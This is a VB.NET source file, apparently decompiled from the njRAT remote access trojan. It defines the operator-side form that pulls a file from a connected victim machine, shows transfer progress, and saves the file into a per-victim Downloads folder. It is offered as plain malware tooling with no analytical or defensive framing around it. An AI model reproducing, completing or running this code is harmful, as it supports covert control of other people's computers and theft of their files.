Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports NJRAT.NJRAT

Public Class DW
    Inherits Form
    ' Methods
    Public Sub New()
        Me.os = 0
        Me.InitializeComponent()
    End Sub

    Private Sub DW_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Try
            Me.FS.Close()
        Catch exception1 As Exception
        End Try
        Try
            Me.FS.Dispose()
        Catch exception4 As Exception
        End Try
        Try
            File.Delete(Me.tmp)
        Catch exception5 As Exception
        End Try
        Me.Button1.Enabled = False
        Me.c.CN = False
    End Sub

    Private Sub DW_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Class7.smethod_1(Me.osk.L), " - "), Class6.smethod_16(Me.FN)))
        Me.ProgressBar1.Maximum = Me.SZ
        Me.folder = Me.osk.Folder + "Downloads\"
        If Not Directory.Exists(Me.folder) Then
            Directory.CreateDirectory(Me.folder)
        End If
        Me.folder += New FileInfo(Class6.smethod_16(Me.FN)).Name
        Me.Lv1.Items.Item(0).SubItems(0).Text = New FileInfo(Class6.smethod_16(Me.FN)).Name
        Me.Lv1.Items.Item(1).SubItems(0).Text = Class6.smethod_17(CLng(Me.SZ))
        Do
            Me.tmp = Interaction.Environ("temp") + "\njfm_" + Class6.smethod_6(10)
        Loop While File.Exists(Me.tmp)
        Me.FS = New FileStream(Me.tmp, FileMode.Append)
        Me.Lv1.Items.Item(2).SubItems(0).Text = Class6.smethod_17(CLng(Me.ProgressBar1.Value - Me.os))
        Me.os = Me.ProgressBar1.Value
        Me.Lv1.Items.Item(3).SubItems(0).Text = Class6.smethod_17(CLng(Me.ProgressBar1.Value))
        Me.Lv1.method_3()
        Me.Timer1.Enabled = True
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            Me.Lv1.Items.Item(2).SubItems(1).Text = Class6.smethod_17(CLng(Me.ProgressBar1.Value - Me.os))
            Me.os = Me.ProgressBar1.Value
            Me.Lv1.Items.Item(3).SubItems(1).Text = Class6.smethod_17(CLng(Me.ProgressBar1.Value))
        Catch ex As Exception
        End Try
    End Sub

    Public c As Client
    Public FN As String
    Public folder As String
    Public FS As FileStream
    Public os As Integer
    Public osk As Client
    Public SZ As Integer
    Public tmp As String

   
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If (Me.Button1.Text = "Stop") Then
            Me.FS.Close()
            Me.FS.Dispose()
            File.Delete(Me.tmp)
            Me.Button1.Enabled = False
            Me.c.CN = False
            Me.Close()
        Else
            Me.FS.Close()
            Me.FS.Dispose()
            File.Move(Me.tmp, Me.folder)
        End If
    End Sub
End Class